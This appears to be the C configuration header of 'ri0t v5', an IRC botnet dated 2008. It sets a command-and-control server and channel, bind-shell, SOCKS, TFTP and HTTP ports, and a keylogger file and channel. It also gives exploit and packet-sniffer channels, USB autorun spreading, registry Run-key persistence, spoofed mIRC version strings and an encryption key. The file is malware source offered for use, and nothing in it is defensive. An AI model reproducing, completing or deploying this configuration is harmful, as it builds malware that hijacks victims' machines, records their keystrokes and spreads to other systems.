unsigned short port = 6667;
unsigned short port2 = 6667;
unsigned short socks4port = 9000;
unsigned short tftpport = 69;
unsigned short httpport = 8085;
unsigned short BIND_PORT = 4460;
BOOL topiccmd = TRUE;
BOOL rndfilename = FALSE;
BOOL AutoStart = TRUE;


char prefix = '.';
int maxrand = 4;
int nicktype = CONSTNICK;
BOOL nickprefix = FALSE;


char botid[] = "[ri0t v5]";
char version[] = ".::[ri0t v5]-[2008 by h1t3m]::.";
char password[] = "test";
char server[] = "irc.lol-wut.net";
char serverpass[] = "";
char channel[] = "#test";	
char chanpass[] = "";				
char server2[] = "irc.lol-wut.net";		
char channel2[] = "#test";			
char chanpass2[] = "";			
char filename[] = "service.exe";		
char keylogfile[] = "service.log";			
char valuename[] = "RIOTBOT";		
char nickconst[] = "ri0t[v5]";			
char szLocalPayloadFile[]="service.exe";	
char modeonconn[] = "-x+i";				
char chanmode[] = "+snt";				
char exploitchan[] = "#test";		
char keylogchan[] = "#test";			
char psniffchan[] = "#test";			

char *authost[] = {
	"*@*",
};

char USB_STR_FILENAME[]	= "autorunme.exe";

char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#ifdef PLAIN_CRYPT
char key[16] = "sEndue3u3hubduyawvd";
#endif
